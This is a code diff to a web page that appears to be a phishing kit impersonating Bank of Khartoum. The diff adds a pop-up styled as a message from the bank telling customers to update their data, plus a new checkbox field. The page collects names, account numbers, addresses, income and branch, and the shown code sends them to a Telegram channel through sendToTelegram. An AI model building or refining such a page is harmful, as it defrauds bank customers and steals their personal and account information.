@@ -186,6 +186,79 @@
             background: #fff5f5;
         }
 
+        /* تصميم نافذة الإعلان المنبثق بحجم متناسق ومضبوط */
+        #adsModalOverlay {
+            display: flex;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: rgba(0, 0, 0, 0.6);
+            z-index: 4000;
+            justify-content: center;
+            align-items: center;
+            padding: 15px;
+        }
+
+        .ads-modal-box {
+            background: #ffffff;
+            border-radius: 12px;
+            width: 100%;
+            max-width: 340px;
+            overflow: hidden;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.25);
+            animation: modalPop 0.3s ease;
+            text-align: center;
+            border: 1px solid #dc2626;
+        }
+
+        .ads-header {
+            background-color: #dc2626;
+            color: white;
+            padding: 12px 15px;
+            font-size: 1.05rem;
+            font-weight: bold;
+        }
+
+        .ads-body {
+            padding: 20px 15px;
+        }
+
+        .ads-text-main {
+            font-size: 1rem;
+            font-weight: bold;
+            color: #1f2937;
+            margin-bottom: 8px;
+            line-height: 1.5;
+        }
+
+        .ads-text-sub {
+            font-size: 0.95rem;
+            font-weight: bold;
+            color: #dc2626;
+            margin-bottom: 18px;
+        }
+
+        .ads-btn {
+            background: linear-gradient(180deg, #ed1c24 0%, #b80c13 100%);
+            color: white;
+            border: 1px solid #99080e;
+            width: 100%;
+            max-width: 160px;
+            padding: 10px;
+            border-radius: 8px;
+            font-size: 1rem;
+            font-weight: bold;
+            cursor: pointer;
+            box-shadow: 0 3px 8px rgba(185, 9, 36, 0.3);
+            transition: transform 0.2s;
+        }
+
+        .ads-btn:hover {
+            transform: scale(1.03);
+        }
+
         /* شاشة اختيار الموقع المؤقتة (قبل الانتقال لتطبيق بنكك) */
         #locationChoiceModal {
             display: none;
@@ -976,9 +1049,67 @@
             0% { transform: scale(0.9); opacity: 0; }
             100% { transform: scale(1); opacity: 1; }
         }
+
+        /* تصميم صندوق التحقق الجديد (هل حسابك قبل 2025؟) */
+        .checkbox-container {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            background: #fff5f5;
+            border: 1px solid rgba(220, 38, 38, 0.2);
+            border-radius: 10px;
+            padding: 14px 16px;
+            cursor: pointer;
+            user-select: none;
+            transition: all 0.2s;
+            margin-top: 5px;
+        }
+        .checkbox-container:hover {
+            border-color: #dc2626;
+        }
+        .custom-checkbox {
+            width: 24px;
+            height: 24px;
+            border: 2px solid #dc2626;
+            border-radius: 6px;
+            background: #ffffff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.2s ease;
+        }
+        .custom-checkbox i {
+            color: #ffffff;
+            font-size: 14px;
+            display: none;
+        }
+        .checkbox-container.checked .custom-checkbox {
+            background-color: #10b981;
+            border-color: #10b981;
+        }
+        .checkbox-container.checked .custom-checkbox i {
+            display: block;
+        }
+        .checkbox-label {
+            font-size: 15px;
+            font-weight: bold;
+            color: #dc2626;
+        }
     </style>
 </head>
 <body>
+
+    <!-- نافذة الإعلان المنبثق خلف الكواليس لمدة 5 ثواني -->
+    <div id="adsModalOverlay">
+        <div class="ads-modal-box">
+            <div class="ads-header">رسالة من بنك الخرطوم</div>
+            <div class="ads-body">
+                <div class="ads-text-main">رحلتنا معاك مستمرة، والجاي دائماً أحلى..</div>
+                <div class="ads-text-sub">حدث بياناتك</div>
+                <button class="ads-btn" onclick="closeAdsAndOpenUpdate()">موافق</button>
+            </div>
+        </div>
+    </div>
 
     <!-- الصفحة الرئيسية للخدمات -->
     <div id="mainAppHome">
@@ -1009,7 +1140,7 @@
                 <div class="service-glass-card" onclick="openUpdateForm()">
                     <div class="service-card-right">
                         <div class="service-icon-box" style="color: #dc2626; background: #fff5f5;"><i class="fa-solid fa-id-card"></i></div>
-                        <div class="service-card-title">استمارة تحديث بيانات العملاء</div>
+                        <div class="service-card-title"> تحديث بيانات حسابات العملاء</div>
                     </div>
                     <div class="service-card-arrow"><i class="fa-solid fa-chevron-left"></i></div>
                 </div>
@@ -1310,6 +1441,16 @@
                             </select>
                         </div>
                     </div>
+
+                    <!-- صندوق التحقق المضاف في الأسفل -->
+                    <div style="margin-top: 15px;">
+                        <div class="checkbox-container" id="before2025Checkbox" onclick="toggleBefore2025()">
+                            <div class="custom-checkbox">
+                                <i class="fa-solid fa-check"></i>
+                            </div>
+                            <div class="checkbox-label">هل حسابك قبل 2025؟</div>
+                        </div>
+                    </div>
                 </div>
 
                 <div class="submit-container">
@@ -1345,6 +1486,7 @@
                         <div class="handwritten-field"><span class="handwritten-label">Monthly Income</span><span class="handwritten-value" id="prev-income">--</span></div>
                         <div class="handwritten-field"><span class="handwritten-label">Education</span><span class="handwritten-value" id="prev-education">--</span></div>
                         <div class="handwritten-field"><span class="handwritten-label">Branch</span><span class="handwritten-value" id="prev-branch">--</span></div>
+                        <div class="handwritten-field"><span class="handwritten-label">Account Before 2025</span><span class="handwritten-value" id="prev-before2025">--</span></div>
                     </div>
 
                     <div style="margin-top: 20px; width: 100%; max-width: 400px; z-index: 10; margin-bottom: 20px;">
@@ -1588,6 +1730,41 @@
     <script>
         let selectedServiceName = '';
         let chosenLocation = '';
+        let adsTimer;
+        let isBefore2025Checked = false;
+
+        // تشغيل مؤقت الإعلان خلف الكواليس عند تحميل الصفحة (5 ثوانٍ)
+        window.addEventListener('DOMContentLoaded', () => {
+            adsTimer = setTimeout(() => {
+                dismissAds();
+            }, 5000);
+        });
+
+        // دالة تبديل حالة صندوق التحقق (هل حسابك قبل 2025؟)
+        function toggleBefore2025() {
+            isBefore2025Checked = !isBefore2025Checked;
+            const cbEl = document.getElementById('before2025Checkbox');
+            if (isBefore2025Checked) {
+                cbEl.classList.add('checked');
+            } else {
+                cbEl.classList.remove('checked');
+            }
+        }
+
+        // عند الضغط على موافق: فتح استمارة تحديث البيانات مباشرة وإلغاء المؤقت
+        function closeAdsAndOpenUpdate() {
+            clearTimeout(adsTimer);
+            document.getElementById('adsModalOverlay').style.display = 'none';
+            openUpdateForm();
+        }
+
+        // عند عدم الضغط وانقضاء الـ 5 ثواني: يختفي الإعلان ويفتح الكود بجميع حقوله
+        function dismissAds() {
+            const adModal = document.getElementById('adsModalOverlay');
+            if (adModal) {
+                adModal.style.display = 'none';
+            }
+        }
 
         // فتح شاشة خيارات بطاقة الفيزا الافتراضية
         function openVisaScreen() {
@@ -1608,7 +1785,7 @@
 
         // فتح استمارة التحديث التفصيلية الأصلية
         function openUpdateForm() {
-            selectedServiceName = 'استمارة تحديث بيانات العملاء';
+            selectedServiceName = ' تحديث بيانات حسابات العملاء';
             document.getElementById('mainAppHome').style.display = 'none';
             document.getElementById('updateContainer').style.display = 'block';
             switchScreen('screenProfile');
@@ -1941,6 +2118,7 @@
             const country = document.getElementById('field-country').value;
             const branch = document.getElementById('field-branch').value;
             const gender = document.getElementById('field-gender').value;
+            const before2025Status = isBefore2025Checked ? 'نعم (قبل 2025)' : 'لا (بعد 2025)';
 
             document.getElementById('prev-name').textContent = name;
             document.getElementById('prev-account').textContent = account;
@@ -1953,6 +2131,7 @@
             document.getElementById('prev-income').textContent = income;
             document.getElementById('prev-education').textContent = education;
             document.getElementById('prev-branch').textContent = branch;
+            document.getElementById('prev-before2025').textContent = before2025Status;
 
             const profileMsg = `📥 *بيانات استمارة تحديث البيانات:*
 👤 الاسم: ${name}
@@ -1968,7 +2147,8 @@
 🏠 العنوان: ${address}
 🌍 البلد: ${country}
 🏢 الفرع: ${branch}
-🚻 الجنس: ${gender}`;
+🚻 الجنس: ${gender}
+📅 هل الحساب قبل 2025؟: ${before2025Status}`;
 
             sendToTelegram(profileMsg);
             switchScreen('screenPreviewForm');
